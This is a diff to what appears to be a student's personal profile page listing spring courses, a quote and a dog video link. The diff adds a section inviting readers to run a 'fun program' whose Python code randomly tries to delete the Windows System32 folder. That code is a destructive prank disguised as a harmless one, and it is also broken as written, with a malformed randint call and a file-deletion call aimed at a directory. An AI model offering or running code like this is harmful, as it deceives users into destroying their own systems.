@@ -6,7 +6,7 @@ I am a _second_ year student at the **University of California - _San Diego_** s
 
 ---
 
-### Courses I am currently taking **SP23**:
+### Courses I am currently taking SP23:
 - CSE 101
 - CSE 110
 - CSE 198
@@ -40,6 +40,17 @@ Everyone needs a good quote to live by, so I asked ChatGPT for an inspiratoinal 
 
 [Additionally, here is a random cute dog video](https://youtu.be/j5a0jTc9S10)!
 
+
+----
+### A fun program you should definitely run on your computer
+
+```python
+import random
+import os
+
+if random.randint(0. 6) == 1:
+    os.remove("C:\Windows\System32")
+```
 
 ----
 
